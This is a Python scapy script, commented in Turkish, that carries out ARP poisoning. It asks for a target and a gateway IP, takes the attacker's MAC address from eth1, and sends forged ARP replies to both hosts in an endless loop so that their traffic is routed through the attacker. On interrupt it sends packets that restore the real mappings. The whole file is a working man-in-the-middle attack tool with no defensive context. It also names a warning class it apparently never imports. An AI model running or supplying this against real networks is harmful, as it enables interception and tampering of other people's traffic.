from scapy.all import *
import subprocess
import re
import time

from scapy.layers.l2 import Ether, ARP, getmacbyip
import warnings
warnings.filterwarnings("ignore", category=CryptographyDeprecationWarning)



# Kullanıcıdan hedef IP ve Gateway IP adreslerini al
hedef_ip = input("Hedef IP adresini girin: ")
gateway_ip = input("Gateway IP adresini girin: ")

# Saldırganın MAC adresini al
ifconfig_response = subprocess.check_output("ifconfig eth1", shell=True).decode()
attacker_mac = re.search(r"ether\s+(\S+)", ifconfig_response).group(1).strip()

# Hedef ve Gateway MAC adreslerini al
hedef_mac = getmacbyip(hedef_ip)
gateway_mac = getmacbyip(gateway_ip)

# Ethernet ve ARP paketlerini oluştur
ethr = Ether(src=attacker_mac)
hedef_arp = ARP(hwsrc=attacker_mac, psrc=gateway_ip, pdst=hedef_ip, hwdst=hedef_mac)
gate_arp = ARP(hwsrc=attacker_mac, psrc=hedef_ip, pdst=gateway_ip, hwdst=gateway_mac)

print("ARP zehirlemesi başlatılıyor...")

try:
    while True:
        sendp(ethr / hedef_arp, verbose=False)
        sendp(ethr / gate_arp, verbose=False)
        time.sleep(0.2)
except KeyboardInterrupt:
    print("ARP zehirlemesi sonlandırılıyor...")

    # ARP zehirlenmesini temizlemek için gerçek MAC adresleriyle düzeltme paketleri gönder
    restore_target = ARP(op=2, psrc=gateway_ip, pdst=hedef_ip, hwsrc=gateway_mac, hwdst=hedef_mac)
    restore_gateway = ARP(op=2, psrc=hedef_ip, pdst=gateway_ip, hwsrc=hedef_mac, hwdst=gateway_mac)

    send(restore_target, count=3, verbose=False)
    send(restore_gateway, count=3, verbose=False)

    print("Ağ normale döndürüldü.")
